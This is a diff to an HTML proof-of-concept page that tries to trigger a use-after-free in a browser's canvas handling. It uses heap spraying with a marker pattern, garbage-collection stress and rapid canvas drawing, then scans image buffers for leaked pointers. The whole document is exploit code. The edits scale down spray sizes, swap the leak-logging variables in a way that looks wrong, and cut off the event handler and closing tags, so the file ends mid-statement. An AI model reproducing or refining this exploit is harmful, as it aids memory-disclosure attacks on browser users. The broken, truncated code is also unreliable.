@@ -32,18 +32,18 @@
 </head>
 <body>
     <h1>Canvas UAF Leak PoC</h1>
-    <p>Click to test UAF and leak address. Expect possible crash.</p>
+    <p>Click to test UAF and leak address. Reduced crash risk.</p>
     <button id="trigger">TEST UAF</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
-    <canvas id="canvas" width="512" height="512"></canvas>
+    <canvas id="canvas" width="256" height="256"></canvas>
     <script>
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const status = document.getElementById('status');
         const consoleDiv = document.getElementById('console');
         let attemptCount = 0;
-        const imageDataSize = 512 * 512 * 4; // 1MB
+        const imageDataSize = 256 * 256 * 4; // 256KB
 
         function log(msg) {
             consoleDiv.append(msg + '\n');
@@ -51,11 +51,11 @@
         }
 
         function stressGC() {
-            for (let i = 0; i < 500; i++) {
-                new ArrayBuffer(1024 * 1024);
+            for (let i = 0; i < 200; i++) { // Reduced
+                new ArrayBuffer(512 * 1024);
             }
-            for (let i = 0; i < 100; i++) {
-                new ArrayBuffer(2 * 1024 * 1024);
+            for (let i = 0; i < 50; i++) {
+                new ArrayBuffer(1024 * 1024);
             }
         }
 
@@ -63,7 +63,7 @@
             ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             ctx.beginPath();
-            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 50, 0, 2 * Math.PI);
+            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 25, 0, 2 * Math.PI);
             ctx.fill();
             const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
             for (let i = 0; i < imageData.data.length; i++) {
@@ -74,8 +74,8 @@
 
         function sprayHeap() {
             const arrays = [];
-            for (let i = 0; i < 5000; i++) { // Reduced from 10000
-                const buf = new ArrayBuffer(imageDataSize);
+            for (let i = 0; i < 1000; i++) { // Reduced from 5000
+                const buf = new ArrayBuffer(imageDataSize); // 256KB
                 const view = new DataView(buf);
                 for (let j = 0; j < buf.byteLength; j += 16) {
                     view.setUint32(j, 0x41424344, true); // ABCD pattern
@@ -98,8 +98,8 @@
                 const ranges = [];
                 let currentRange = null;
 
-                // Compare first 4096 bytes, group consecutive changes
-                for (let i = 0; i < Math.min(original.length, 4096); i++) {
+                // Compare first 2048 bytes
+                for (let i = 0; i < Math.min(original.length, 2048); i++) {
                     try {
                         if (originalCopy[i] !== current[i]) {
                             differenceCount++;
@@ -132,7 +132,7 @@
                 let leak = null;
                 try {
                     const currentView = new DataView(current.buffer);
-                    for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 4096); i += 4) {
+                    for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 2048); i += 4) {
                         if (currentView.getUint32(i, true) === 0x41424344) {
                             const lo = currentView.getUint32(i + 4, true);
                             const hi = currentView.getUint32(i + 8, true);
@@ -165,18 +165,18 @@
 
             try {
                 // Create reference ImageData
-                const refImageData = ctx.createImageData(512, 512);
+                const refImageData = ctx.createImageData(256, 256);
                 const refView = new Uint8Array(refImageData.data.buffer);
                 for (let i = 0; i < refView.length; i++) {
                     refView[i] = 0x46;
                 }
 
                 // Spray heap
-                log('Spraying heap with 5000 buffers...');
+                log('Spraying heap with 1000 buffers...');
                 const sprayed = sprayHeap();
 
                 // Intensive drawing
-                const drawInterval = setInterval(drawOnCanvas, 1);
+                const drawInterval = setInterval(drawOnCanvas, 5); // Increased interval
 
                 // Check for UAF
                 setTimeout(async () => {
@@ -231,9 +231,9 @@
                                 if (secondResult.leak) {
                                     status.textContent += `\nLeak at offset ${secondResult.leak.offset}!`;
                                     log(`Leak at offset ${secondResult.leak.offset}:`);
-                                    log(`Pattern: ${secondResult.leak.pattern}`);
-                                    log(`Ptr: ${secondResult.leak.ptr}`);
-                                    log(`Buffer index: ${secondResult.leak.index}`);
+                                    log(`Pattern: ${result.leak.pattern}`);
+                                    log(`Ptr: ${result.leak.ptr}`);
+                                    log(`Buffer index: ${result.leak.index}`);
                                 }
                             } else {
                                 status.textContent += '\nUAF occurred, no bytes checked';
@@ -244,21 +244,6 @@
                             log('No UAF detected');
                         }
                     }
-                }, 200); // Increased timeout
+                }, 300); // Increased timeout
             } catch (err) {
-                status.textContent = `Failed: ${err.message}`;
-                log(`Error: ${err.message}`);
-            }
-        }
-
-        document.getElementById('trigger').addEventListener('click', async () => {
-            try {
-                await detectUAF();
-            } catch (err) {
-                status.textContent = `Failed: ${err.message}`;
-                log(`Error: ${err.message}`);
-            }
-        });
-    </script>
-</body>
-</html>
+                status.textContent =
